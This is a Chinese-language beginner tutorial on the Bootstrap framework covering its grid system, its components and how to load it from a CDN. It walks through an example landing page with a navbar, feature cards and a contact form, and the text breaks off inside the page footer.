.hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><p>在前端开发中，我们常常面临一个难题：如何快速构建一个既美观又能在各种设备上正常显示的网站？传统CSS编写耗时耗力，特别是响应式布局的实现需要大量媒体查询代码。这时，Bootstrap框架应运而生！
Bootstrap是Twitter开发的一个开源前端框架，它提供了一套完整的CSS样式、组件和JavaScript插件，让我们能够快速搭建专业水准的网站，特别适合初学者和需要快速开发的场景。</p>
<h2 data-id="heading-0">Bootstrap核心概念</h2>
<h3 data-id="heading-1">1. 响应式设计</h3>
<p>Bootstrap采用移动优先的设计理念，网站能够自动适应不同尺寸的屏幕，从手机到桌面电脑都能完美显示。</p>
<h3 data-id="heading-2">2. 网格系统</h3>
<p>Bootstrap的核心是12列网格系统，通过行(row)和列(column)的组合来创建页面布局。</p>
<h3 data-id="heading-3">3. 组件库</h3>
<p>提供了丰富的预定义组件，如导航栏、按钮、表单、卡片等，可以直接使用。</p>
<h2 data-id="heading-4">开始使用Bootstrap</h2>
<h3 data-id="heading-5">引入Bootstrap</h3>
<p>首先需要在HTML文件中引入Bootstrap的CSS和JS文件：</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>我的Bootstrap网站<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引入Bootstrap CSS --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 页面内容 --&gt;</span>
    
    <span class="hljs-comment">&lt;!-- 引入Bootstrap JS 和 Popper --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-6">完整页面示例</h2>
<p>下面是一个使用Bootstrap搭建的完整简单页面示例：</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>我的Bootstrap网站<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 引入Bootstrap CSS --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-class">.hero-section</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#6a11cb</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#2575fc</span> <span class="hljs-number">100%</span>);
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">100px</span> <span class="hljs-number">0</span>;
        }
        <span class="hljs-selector-class">.feature-icon</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>;
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#0d6efd</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">justify-content</span>: center;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
        <span class="hljs-selector-tag">footer</span> {
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f8f9fa</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">40px</span> <span class="hljs-number">0</span>;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">50px</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 导航栏 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar navbar-expand-lg navbar-dark bg-dark"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-brand"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>我的网站<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-toggler"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"collapse"</span> <span class="hljs-attr">data-bs-target</span>=<span class="hljs-string">"#navbarNav"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-toggler-icon"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"collapse navbar-collapse"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"navbarNav"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-nav ms-auto"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link active"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>关于我们<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>服务<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>联系我们<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 主要内容区域 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 英雄区域 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hero-section text-center"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"display-4 fw-bold"</span>&gt;</span>欢迎来到我的网站<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"lead"</span>&gt;</span>使用Bootstrap构建的现代化响应式网站<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-light btn-lg mt-3"</span>&gt;</span>了解更多<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 特性介绍 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"py-5"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center mb-5"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>我们的服务<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-muted"</span>&gt;</span>我们提供全方位的解决方案<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row"</span>&gt;</span>
                    <span class="hljs-comment">&lt;!-- 特性1 --&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-4 mb-4"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card h-100 border-0 shadow-sm"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body text-center"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"feature-icon mx-auto"</span>&gt;</span>
                                    <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"white"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 16 16"</span>&gt;</span>
                                        <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zM4.5 7.5a.5.5 0 0 0 0 1h5.793l-2.147 2.146a.5.5 0 0 0 .708.708l3-3a.5.5 0 0 0 0-.708l-3-3a.5.5 0 1 0-.708.708L10.293 7.5H4.5z"</span>/&gt;</span>
                                    <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
                                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">h5</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>快速开发<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-text"</span>&gt;</span>使用Bootstrap可以快速构建现代化网站，大大缩短开发时间。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span>&gt;</span>了解更多<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-comment">&lt;!-- 特性2 --&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-4 mb-4"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card h-100 border-0 shadow-sm"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body text-center"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"feature-icon mx-auto"</span>&gt;</span>
                                    <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"white"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 16 16"</span>&gt;</span>
                                        <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M6 10.5a.5.5 0 0 1 .5-.5h3a.5.5 0 0 1 0 1h-3a.5.5 0 0 1-.5-.5zm-2-3a.5.5 0 0 1 .5-.5h7a.5.5 0 0 1 0 1h-7a.5.5 0 0 1-.5-.5zm-2-3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5z"</span>/&gt;</span>
                                    <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
                                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">h5</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>响应式设计<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-text"</span>&gt;</span>自动适应各种屏幕尺寸，从手机到桌面电脑都能完美显示。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span>&gt;</span>了解更多<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-comment">&lt;!-- 特性3 --&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-4 mb-4"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card h-100 border-0 shadow-sm"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-body text-center"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"feature-icon mx-auto"</span>&gt;</span>
                                    <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"white"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 16 16"</span>&gt;</span>
                                        <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M2 1a1 1 0 0 0-1 1v4.586a1 1 0 0 0 .293.707l7 7a1 1 0 0 0 1.414 0l4.586-4.586a1 1 0 0 0 0-1.414l-7-7A1 1 0 0 0 6.586 1H2zm4 3.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0z"</span>/&gt;</span>
                                    <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
                                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">h5</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-title"</span>&gt;</span>丰富组件<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"card-text"</span>&gt;</span>提供丰富的预定义组件，导航栏、按钮、表单等可以直接使用。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span>&gt;</span>了解更多<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 联系表单 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"py-5 bg-light"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row justify-content-center"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-8"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-center mb-4"</span>&gt;</span>联系我们<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-6 mb-3"</span>&gt;</span>
                                    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"firstName"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>名字<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
                                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"firstName"</span> <span class="hljs-attr">required</span>&gt;</span>
                                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-6 mb-3"</span>&gt;</span>
                                    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"lastName"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>姓氏<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
                                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"lastName"</span> <span class="hljs-attr">required</span>&gt;</span>
                                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mb-3"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>邮箱地址<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"email"</span> <span class="hljs-attr">required</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mb-3"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-label"</span>&gt;</span>留言<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-control"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"message"</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">required</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"d-grid"</span>&gt;</span>
                                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary btn-lg"</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 页脚 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mb-0"</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> 2023 我的网站. 保留所有权利.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"mt-2"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-decoration-none me-3"</span>&gt;</span>隐私政策<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-decoration-none"</span>&gt;</span>使用条款<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
